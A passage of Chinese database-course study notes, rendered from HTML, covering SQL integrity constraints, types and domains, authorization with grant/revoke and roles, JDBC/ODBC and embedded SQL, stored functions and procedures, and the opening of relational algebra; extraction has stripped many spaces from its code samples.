class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 参照完整性中的级联行为</span><br><span class="line">create table course (</span><br><span class="line">    course_idchar(5) primary key,</span><br><span class="line">    titlevarchar(20),</span><br><span class="line">    dept_namevarchar(20) references department)</span><br><span class="line"></span><br><span class="line">create table course (</span><br><span class="line">    …</span><br><span class="line">    dept_name varchar(20),</span><br><span class="line">    foreign key (dept_name) references department</span><br><span class="line">    on delete cascade</span><br><span class="line">    on update cascade,</span><br><span class="line">    . . . </span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 级联行为的替代方式: set null,set default</span><br></pre></td></tr></table></figure><ul><li>删除基本关系元组<ul><li><code>Restrict</code>方式：只有当依赖关系中没有一个外码值与要删除的基本关系的主码值相对应时，才可以删除该元组，否则系统拒绝此删除操作</li><li><code>Cascade</code>方式：将依赖关系中所有外码值与基本关系中要删除的主码值所对应的元组一起删除</li><li><code>Set null</code>方式：删除基本关系中元组时，将依赖关系中与基本关系中被删主码值相对应的外码值置为空值</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Foreignkey(Sno)ReferencesS(Sno)[ondelete[cascade|set null]]</span><br></pre></td></tr></table></figure><ul><li>修改基本关系元组<ul><li><code>Restrict</code>方式：只有当依赖关系中没有一个外码值与要修改的基本关系的主码值相对应时，才可以修改该元组主码，否则系统拒绝此次修改</li><li><code>Cascade</code>方式：将依赖关系中所有与基本关系中要修改的主码值所对应的外码值一起修改为新值</li><li><code>Set null</code>方式：修改基本关系中元组主码时，将依赖关系中与基本关系中被修改主码值相对应的外码值置为空值</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Foreignkey(Sno)ReferencesS(Sno)[onupdate[cascade|set null]]</span><br></pre></td></tr></table></figure><h5 id="复杂check子句"><a href="#复杂check子句" class="headerlink" title="复杂check子句"></a>复杂check子句</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">createassertion&lt;assertion-name&gt;check&lt;predicate&gt;</span><br></pre></td></tr></table></figure><h4 id="SQL的数据类型与模式"><a href="#SQL的数据类型与模式" class="headerlink" title="SQL的数据类型与模式"></a>SQL的数据类型与模式</h4><h5 id="SQL固有的数据类型"><a href="#SQL固有的数据类型" class="headerlink" title="SQL固有的数据类型"></a>SQL固有的数据类型</h5><ul><li>date：日期，包括年(四位)、月、日，如<code>date  &#39;2005-7-27&#39;</code></li><li>time：时间，包括小时、分、秒，如<code>time  &#39;09:00:30&#39;</code>，<code>time  &#39;09:00:30.75&#39;</code></li><li>timestamp：date和time的组合，如<code>timestamp  &#39;2005-7-27 09:00:30.75&#39;</code></li><li>interval：时间段，如<code>interval  &#39;1&#39; day</code><ul><li>两个 date/time/timestamp 类型值相减产生一个 interval 类型值</li><li>可以在 date/time/timestamp 类型的值上加减 interval 类型的值</li></ul></li></ul><h5 id="用户定义的类型"><a href="#用户定义的类型" class="headerlink" title="用户定义的类型"></a>用户定义的类型</h5><p>SQL中的<code>create type</code>结构创建用户定义的类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line">create typeDollarsas numeric(12,2)final</span><br><span class="line"></span><br><span class="line">createtabledepartment(</span><br><span class="line">4dept_namevarchar(20),</span><br><span class="line">    buildingvarchar(15),</span><br><span class="line">    budgetDollars</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>SQL-92中的<code>create domain</code>结构创建用户定义的域类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">createdomainperson_namechar(20)not null</span><br><span class="line"></span><br><span class="line">create domaindegree_levelvarchar(10)</span><br><span class="line">constraintdegree_level_test</span><br><span class="line">check(value in (&apos;Bachelors&apos;,&apos;Masters&apos;,&apos;Doctorate&apos;))</span><br></pre></td></tr></table></figure><p>类型和域相似，但是域本身可以指定约束，比如<code>not null</code></p><ul><li>用户定义类型<ul><li>独特类型：<code>distinct type</code>：<code>create type Dollars as numeric(12,2)</code></li><li>结构化：<code>structured</code>：<code>create type person(pid char(18),name varchar(8))</code></li><li>用户定义类型，本质上是对RDB的面向对象扩展</li></ul></li><li>用户定义域：<code>create domain Dollar as numeric(12,2)</code><ul><li>自定义域不支持结构</li></ul></li></ul><ul><li>Type vs Domain<ul><li>Type：进行强类型检查</li><li>Domain：不进行强类型检查，支持强制类型转换</li><li>Type由严格的OO理论基础，Domain时纯RDB的概念</li></ul></li></ul><h5 id="大对象类型"><a href="#大对象类型" class="headerlink" title="大对象类型"></a>大对象类型</h5><p>大对象类型（照片、视频、CAD文件等）以<code>large object</code>类型存储</p><ul><li>blob：二进制数据的大对象数据类型——对象是没有被解释的二进制数据的大集合（对二进制数据的解释由数据库系统以外的应用程序完成）</li><li>clob：字符数据的大对象数据类型——对象是字符数据的大集合</li></ul><p>当查询结果是一个大对象时，返回的是指向这个大对象的指针，而不是大对象本身</p><p>LOB：Large OBject，用于存储大空间的值，存储由指针加文件实现</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/16.jpg" alt></p><p>LOB访问：一般使用专用语句访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Oracle</span><br><span class="line">select Blob doc into ...</span><br><span class="line">frombook</span><br><span class="line">where cno = &apos;c1&apos;</span><br></pre></td></tr></table></figure><h4 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h4><h5 id="权限的转授和回收"><a href="#权限的转授和回收" class="headerlink" title="权限的转授和回收"></a>权限的转授和回收</h5><p>允许用户把已获得的权限转授给其他用户，也可以把已授给其他用户的权限在回收上来</p><h5 id="权限图"><a href="#权限图" class="headerlink" title="权限图"></a>权限图</h5><p>节点是用户，根节点是DBA，有向边U<sub>i</sub> &rarr; U<sub>j</sub> ，表示用户U<sub>i</sub> 把某权限授给用户U<sub>j</sub> </p><p>一个用户拥有权限的充分必要条件是在权限图有一条从根节点到该用户节点的路径</p><p>数据库某些部分的几种授权形式：</p><ul><li>Read：允许读取，但是不能修改数据</li><li>Insert：允许插入新数据，但是不能修改已有的数据</li><li>Update：允许修改，但是不能删除数据</li><li>Delete：允许删除数据</li></ul><p>修改数据库模式的几种授权形式：</p><ul><li>Index：允许创建和删除索引</li><li>Resources：允许创建新的关系</li><li>Alteration：允许增加或删除关系的属性</li><li>Drop：允许删除关系</li></ul><h5 id="SQL中的授权规范"><a href="#SQL中的授权规范" class="headerlink" title="SQL中的授权规范"></a>SQL中的授权规范</h5><p><code>grant</code>语句用于授予权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant&lt;权限列表&gt;</span><br><span class="line">on&lt;关系名|视图名&gt; to &lt;用户|角色列表&gt;</span><br></pre></td></tr></table></figure><p>&lt;用户|角色列表&gt;：<strong>一个用户id</strong> | <strong>public</strong>，所有合法用户持有所授权限 | <strong>一个角色</strong></p><p>对于某个视图授权后，并没有对该视图所基于的关系授权</p><p>权限的授予者必须已经持有相应的权限（或者是数据库管理员）</p><blockquote><p>权限列表：</p><ul><li>select：允许对关系进行读访问，或者使用视图进行查询的能力</li><li>insert：插入元组的能力</li><li>update：更新元组的能力</li><li>delete：删除元组的能力</li><li>all privileges：所有允许权限的简写形式</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; # 例</span><br><span class="line">&gt; # 将对关系instructor的select权限授予用户U1U2U3</span><br><span class="line">&gt; grant select on instructor to User1,User2,User3</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote></blockquote><p><code>revoke</code>语句用于收回权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">revoke&lt;权限列表&gt;</span><br><span class="line">on&lt;关系名|视图名&gt;from&lt;用户|角色列表&gt;</span><br></pre></td></tr></table></figure><p>&lt;权限列表&gt;可以是<code>all</code>，表示收回被收回人持有的所有权限</p><p>如果<revoke-list> 包含<code>public</code>的话，则除了显式地被授予权限的用户外，所有的用户将失去权限</revoke-list></p><p>如果同意权限由不同授权人两次授予同一用户，用户在一次权限被回收后，仍保持有权限</p><p>收回权限时，若该用户已将权限授予其他用户，也一并收回</p><h5 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">createroleinstructor</span><br><span class="line">grantinstructorto Amit</span><br><span class="line"># 角色可以被授以权限</span><br><span class="line">grant select on takes to instructor</span><br><span class="line"># 角色可以授以用户，也可以被授以其他角色</span><br><span class="line">createroleteaching_assistant</span><br><span class="line">grantteaching_assistant to instructor</span><br><span class="line"># instructor 继承teaching_assistant的所有权限</span><br></pre></td></tr></table></figure><p>角色链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create role dean</span><br><span class="line">grant instructor to dean</span><br><span class="line">grant dean to Satoshi</span><br></pre></td></tr></table></figure><h5 id="视图的权限"><a href="#视图的权限" class="headerlink" title="视图的权限"></a>视图的权限</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create view geo_instructor as (</span><br><span class="line">4select*</span><br><span class="line">    from instructor</span><br><span class="line">    wheredept_name = &apos;Geology&apos;</span><br><span class="line">)</span><br><span class="line">grantselect on geo_instructor to geo_staff</span><br></pre></td></tr></table></figure><p><code>references</code>权限创造外码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant references (dept_name) on department to Mariano</span><br></pre></td></tr></table></figure><p>权限的转移：<code>with grant option</code></p><p>授予其权限并允许用户可以将此权限授予其他用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant select on table_name to Alice with grant option</span><br></pre></td></tr></table></figure><h3 id="高级SQL"><a href="#高级SQL" class="headerlink" title="高级SQL"></a>高级SQL</h3><h4 id="使用程序设计语言访问数据库"><a href="#使用程序设计语言访问数据库" class="headerlink" title="使用程序设计语言访问数据库"></a>使用程序设计语言访问数据库</h4><blockquote><ul><li>动态SQL<ul><li>JDBC和ODBC</li></ul></li><li>嵌入式SQL</li></ul></blockquote><p>API（Application-program interface）用于程序和数据库服务器之间的交互</p><p>应用程序调用：①与数据库服务器连接；②向数据库服务器发送SQL命令；③逐个取结果元组到程序变量</p><p>ODBC（Open Database Connectivity）：用于C，C++，C#和Visual Basic</p><p>JDBC（JAVA Database Connective）：用于Java</p><h5 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h5><p>JDBC是一个支持SQL的Java API，用于与数据库系统通信</p><p>JDBC支持查询和更新数据、检索查询结果等多种功能</p><p>JDBC也支持元数据检索，例如查询当前数据库中的关系、关系属性的名字和类型</p><blockquote><p> 与数据库的通信模型</p><ul><li>打开一个连接</li><li>创建一个statement对象</li><li>使用statement对象执行查询，发送查询并取回结果</li><li>处理错误的异常处理机制</li></ul></blockquote><p>JDBC的基本工作步骤如下：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/18.jpg" alt></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span><span class="keyword">static</span><span class="keyword">void</span><span class="title">JDBCExample</span><span class="params">(String dbid,String userid,String passwd)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//1.Load the JDBC driver class</span></span><br><span class="line">        Class.forName(<span class="string">"oracle.jdbc.driver.OracleDriver"</span>);</span><br><span class="line">        <span class="comment">//2.Open a database connection</span></span><br><span class="line">        <span class="comment">//jdbc:database_type:mode:URI</span></span><br><span class="line">        <span class="comment">//database_type = [mysql,oracle,...]</span></span><br><span class="line">        <span class="comment">//oracle:URI: @URI</span></span><br><span class="line">        <span class="comment">//mysql:URI://URI</span></span><br><span class="line">        Connectionconn = DriverManager.getConnection(</span><br><span class="line">            <span class="string">"jdbc:oracle:thin:@URI"</span>, userid, passwd);</span><br><span class="line">        <span class="comment">//3.Issue SQL statements</span></span><br><span class="line">        Statementstmt = conn.createStatement();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        *4.Process result set</span></span><br><span class="line"><span class="comment">        *DoActualWork</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        stmt.close();</span><br><span class="line">        conn.close();</span><br><span class="line">    &#125;<span class="keyword">catch</span>(SQLExceptionsqle)&#123;</span><br><span class="line">     System.out.println(<span class="string">"SQLException: "</span> + sqle);   </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">//Actual Work</span></span><br><span class="line"><span class="comment">//update</span></span><br><span class="line">stmt.executeUpdate(<span class="string">"insert into instructor values('"</span> + a1 + <span class="string">"', 'Kim','Physics',98000)"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//query</span></span><br><span class="line">Result rset = stmt.executeQuery(<span class="string">"Select dept_name ,avg(salary) from instructor group by dept_name"</span>);</span><br><span class="line"><span class="keyword">while</span>(rset.next())&#123;</span><br><span class="line">    System.out.println(rset.getString(<span class="string">"dept_name"</span>) + <span class="string">"\t"</span> + rset.getFloat(<span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//null</span></span><br><span class="line">rset.wasNull() = <span class="keyword">true</span>;</span><br></pre></td></tr></table></figure><h5 id="JDBC：立即执行VS预备语句"><a href="#JDBC：立即执行VS预备语句" class="headerlink" title="JDBC：立即执行VS预备语句"></a>JDBC：立即执行VS预备语句</h5><ul><li>立即执行<ul><li>使用<code>Statement</code>类，将SQL语句直接交给DBMS执行</li><li>一次语句执行DBMS进行一次语句编译</li></ul></li><li>使用预备语句执行<ul><li>使用<code>PreparedStatement</code>类，SQL语句执行，首先进行编译，编译结果赋予<code>PreparedStatement</code>的对象</li><li>预编译的结果可被反复多次执行</li><li>同嵌入SQL预编译不同（在编译程序时进行），JDBC的预编译时在程序运行中进行的</li></ul></li><li>一个SQL多次执行<ul><li>使用预备语句，仅编译一次</li><li>立即执行的模式下，需多次编译</li><li>在一SQL多次执行时，使用预备语句比立即执行的</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 预备语句</span></span><br><span class="line">PreparedStatementpStmt = conn.prepareStatement(</span><br><span class="line">4<span class="string">"insert into instructor values(?,?,?,?)"</span>);</span><br><span class="line">pStmt.setString(<span class="number">1</span>,<span class="string">"88888"</span>);</span><br><span class="line">pStmt.setString(<span class="number">2</span>,<span class="string">"Alice"</span>);</span><br><span class="line">pStmt.setString(<span class="number">3</span>,<span class="string">"Finance"</span>);</span><br><span class="line">pStmt.setInt(<span class="number">4</span>,<span class="number">1250000</span>);</span><br><span class="line">pStmt.executeUpdate();</span><br><span class="line">pStmt.setString(<span class="number">1</span>,<span class="string">"88888"</span>);</span><br><span class="line">pStmt.executeUpdate();</span><br></pre></td></tr></table></figure><p>对于查询，使用<code>pStmt.executeQuery()</code>，返回一个结果集（ResultSet）</p><p>将一个来自用户的输入添加到查询时，使用预备语句比较好</p><p>SQL语句的预编译能够有效防止SQL注入</p><h5 id="元数据特性"><a href="#元数据特性" class="headerlink" title="元数据特性"></a>元数据特性</h5><p>ResultSet：元数据：描述数据的数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ResultSet rs;<span class="comment">//执行完查询后得到的结果</span></span><br><span class="line">ResultSetMetaData rsmd = rs。getMetaData();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i&lt;=rsmd.getColumnCount();i++)&#123;</span><br><span class="line">    System.out.println(rsmd.getColumnName(i));</span><br><span class="line">    System.out.println(rsmd.getColumnTypeName(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上，就是用java代码获取元数据的代码</p><p>查询结果的元数据：①对描述查询结果集的属性类型（结果集的模式）；②对编程时不能确定的结果集模式时非常有用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DatabaseMetaData dbmd = conn.getMetaData();</span><br><span class="line">4ResultSet rs = dbmd.getColumns(<span class="keyword">null</span>, <span class="string">"univdb"</span>, <span class="string">"department"</span>, <span class="string">"%"</span>);</span><br><span class="line">4<span class="comment">// Arguments to getColumns: Catalog, Schema-pattern, Table-pattern,</span></span><br><span class="line">4<span class="comment">// and Column-Pattern</span></span><br><span class="line">4<span class="comment">// Returns: One row for each column; row has a number of attributes</span></span><br><span class="line">4<span class="comment">// such as COLUMN_NAME, TYPE_NAME</span></span><br><span class="line"><span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">    System.out.println(rs.getString(<span class="string">"COLUMN_NAME"</span>),rs.getString(<span class="string">"TYPE_NAME"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>DatabaseMetaData</code>类：JDBC的一个类，对DB数据字典进行封装，类方法可以读取数据字典元数据，屏蔽了数据字典的具体实现模式，对应用提供了访问DB数据字典元数据的标准方法</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/19.jpg" alt></p><h5 id="JDBC的事务控制"><a href="#JDBC的事务控制" class="headerlink" title="JDBC的事务控制"></a>JDBC的事务控制</h5><p>在默认情况下，每个SQL语句都被作为一个被自动提交的独立的事务</p><p>对于有多个更新的事务，这种做法并不好</p><p>可以通过代码关闭自动提交：<code>conn.setAutoCommit(false);</code></p><p>事务必须被显式的提交或回滚：<code>conn.commit();</code>或<code>conn.rollback();</code></p><p>打开自动提交：<code>conn.setAutoCommit(true);</code></p><h5 id="调用函数和过程"><a href="#调用函数和过程" class="headerlink" title="调用函数和过程"></a>调用函数和过程</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CallableStatement cStmt1 = conn.prepareCall(<span class="string">"&#123;? = call some function(?)&#125;"</span>);</span><br><span class="line">CallableStatement cStmt2 = conn.prepareCall(<span class="string">"&#123;call some procedure(?,?)&#125;"</span>);</span><br></pre></td></tr></table></figure><h5 id="处理大型对象类型"><a href="#处理大型对象类型" class="headerlink" title="处理大型对象类型"></a>处理大型对象类型</h5><p><code>getBlob()</code>和<code>getClob()</code>与<code>getString()</code>方法类似，但是分别返回Blob和Clob对象</p><p>通过<code>getBytes()</code>从这些对象里得到数据</p><p>将一个开放的流域Java Blob或Clob对象相连，来更新大对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blob.setBlob(<span class="keyword">int</span> parameterIndex, InputStream inputStream);</span><br></pre></td></tr></table></figure><h5 id="SQLJ"><a href="#SQLJ" class="headerlink" title="SQLJ"></a>SQLJ</h5><p>由于JDBC的动态化，编译器无法捕捉其错误，因此有SQLJ</p><p>SQLJ：在java中的嵌入式SQL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#sql iterator deptInfoIter ( String dept name, int avgSal);</span><br><span class="line">deptInfoIter iter = <span class="keyword">null</span>;</span><br><span class="line">#sql iter = &#123; select dept_name, avg(salary) from instructor </span><br><span class="line">    group by dept name &#125;;</span><br><span class="line"><span class="keyword">while</span> (iter.next()) &#123;</span><br><span class="line">4String deptName = iter.dept_name();</span><br><span class="line">4<span class="keyword">int</span> avgSal = iter.avgSal();</span><br><span class="line">4System.out.println(deptName + <span class="string">" "</span> + avgSal);</span><br><span class="line">&#125;</span><br><span class="line">iter.close();</span><br></pre></td></tr></table></figure><h5 id="ODBC"><a href="#ODBC" class="headerlink" title="ODBC"></a>ODBC</h5><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/17.jpg" alt="ODBC_Struct"></p><p>ODBC结构如上图</p><p>ODBC：Open Database Connectivity标准：</p><ul><li>应用程序与数据库服务器通信标准</li><li>应用程序接口<ul><li>与数据库建立一个连接</li><li>发送查询和更新数据库的语句</li><li>取回结果</li></ul></li></ul><p>（略）</p><h5 id="嵌入式SQL"><a href="#嵌入式SQL" class="headerlink" title="嵌入式SQL"></a>嵌入式SQL</h5><p>SQL标准定义了许多语言的嵌入式SQL，如C，JAVA，Cobol</p><p>SQL查询所嵌入的语言被称为宿主语言（host language），宿主语言中使用的SQL结构被称为嵌入式SQL</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/20.jpg" alt></p><p>这些语言的基本形式遵循System R的嵌入到PL/I的SQL的形式</p><p>（略）</p><h4 id="函数和过程和结构"><a href="#函数和过程和结构" class="headerlink" title="函数和过程和结构"></a>函数和过程和结构</h4><p>SQL：1999支持函数和过程</p><ul><li>函数/过程可以用SQL自身写，也可以用外部编程语言写</li><li>函数对专门的数据类型，如图像和几何对象特别有用</li><li>许多数据库系统支持<strong>表值函数（table-valued functions）</strong>，表值函数会返回一个关系作为结果</li></ul><p>SQL：1999支持许多命令式结构，包括循环（loops）、if-then-else、赋值（assignment）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 定义一个函数,输入一个系的名字,返回该系的教师数量</span><br><span class="line">createfunctiondept_count(dept_namevarchar(20))</span><br><span class="line">4returnsinteger</span><br><span class="line">4begin</span><br><span class="line">44declared_countinteger;</span><br><span class="line">44selectcount(*)intod_count</span><br><span class="line">44frominstructor</span><br><span class="line">44whereinstructor.dept_name = dept_name</span><br><span class="line">44return d_count;</span><br><span class="line">4end</span><br><span class="line">4</span><br><span class="line"># 找出教师数大于12的所有系的名称和预算</span><br><span class="line">selectdept_name,budget</span><br><span class="line">from department</span><br><span class="line">wheredept_count(dept_name) &gt; 12</span><br></pre></td></tr></table></figure><p>SQL：2003增加了返回关系作为结果的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 返回一个包含特定系的所有教师的表</span><br><span class="line">createfunctioninstructors_of(dept_namechar(20))</span><br><span class="line">4returnstable(IDvarchar(5),</span><br><span class="line">                    name varchar(20),</span><br><span class="line">                     dept_name varchar(20),</span><br><span class="line">                     salarynumeric(8,2))</span><br><span class="line"></span><br><span class="line">return table (select ID,name,dept_name,salary</span><br><span class="line">             frominstructor</span><br><span class="line">             whereinstructor.dept_name = instructors_of.dept_name)</span><br><span class="line"></span><br><span class="line">#use</span><br><span class="line">select * </span><br><span class="line">fromtable(instructs_or(&apos;Music&apos;))</span><br></pre></td></tr></table></figure><p><code>dept_count</code>函数也可以写成一个过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create procedure dept_count_proc (in dept_name varchar(20),</span><br><span class="line">                                  out d_count integer)</span><br><span class="line">begin</span><br><span class="line">4  select count(*) into d_count</span><br><span class="line">4  from instructor</span><br><span class="line">4  where instructor.dept_name = dept_count_proc.dept_name</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"># 可以在一个SQL过程中或者嵌入式SQL中使用call语句调用过程</span><br><span class="line">declared_countinteger;</span><br><span class="line">calldept_count_proc(&apos;Physics&apos;,d_count);</span><br></pre></td></tr></table></figure><p>过程和函数可以通过动态SQL触发</p><p>SQL:1999：允许使用多个同名过程/函数（称为名字<strong>重载</strong>），只要参数的个数不同，或对于那些有相同参数个数的函数，至少有一个参数的类型不同</p><h4 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h4><p>（略）</p><h2 id="形式化关系查询语言"><a href="#形式化关系查询语言" class="headerlink" title="形式化关系查询语言"></a>形式化关系查询语言</h2><h3 id="关系代数"><a href="#关系代数" class="headerlink" title="关系代数"></a>关系代数</h3><ul><li>关系代数</li><li>六种基本运算符<ul><li>选择（Select）：σ</li><li>投影（Project）：Π</li><li>并（union）：∪</li><li>集合差（set difference）：-</li><li>笛卡儿积（Cartesian product）：×</li><li>更名（rename）：ρ</li></ul></li><li>关系代数的运算以一个或两个关系作为输入，产生一个新的关系作为结果</li></ul><h4 id="选择运算"><a href="#选择运算" class="headerlink" title="选择运算"></a>选择运算</h4><ul><li><p>记法：σ<sub>p</sub>(r)</p></li><li><p>p被称为<strong>选择谓词</strong></p></li><li>定义为： σ<sub>p</sub>(r) = { t | t ∈ r and p(t) }，其中p是一个命题演算公式，由连词（∧(and)，∨(or)， ┐(not)）把项连接起来构成每一个项（term）的形式可以为：<code>&lt;attribute&gt; op &lt;attribute&gt; or &lt;constant&gt;</code> ，其中op可以是：=，≠，&gt;，≥，&lt;，≤</li><li>示例：σ<sub> dept_name = “Physics”</sub>(instructor)</li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/21.jpg" alt></p><p>选择运算是从行的角度进行的运算</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/22.jpg" alt></p><h4 id="投影运算"><a href="#投影运算" class="headerlink" title="投影运算"></a>投影运算</h4><ul><li>记法：Π<sub>A<sub>1</sub>,A<sub>2</sub>,…,A<sub>k</sub></sub>(r) ，其中A<sub>1</sub>,A<sub>2</sub>,…,A<sub>k</sub> 是属性名，r是关系名</li><li>结果由选择的k列组成，删除了没有被选择的其他列</li><li>因为关系是集合，所以重复的元组从结果中删除</li><li>示例：Π<sub>ID, name, salary</sub>(instructor) </li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/23.jpg" alt></p><p>投影操作主要是从列的角度进行运算</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Database-System/24.jpg" alt></p><h4 id="并运算"><a href="#并运算" class="headerlink" title="并运算"></a>并运算</h4><ul><li>记法：r 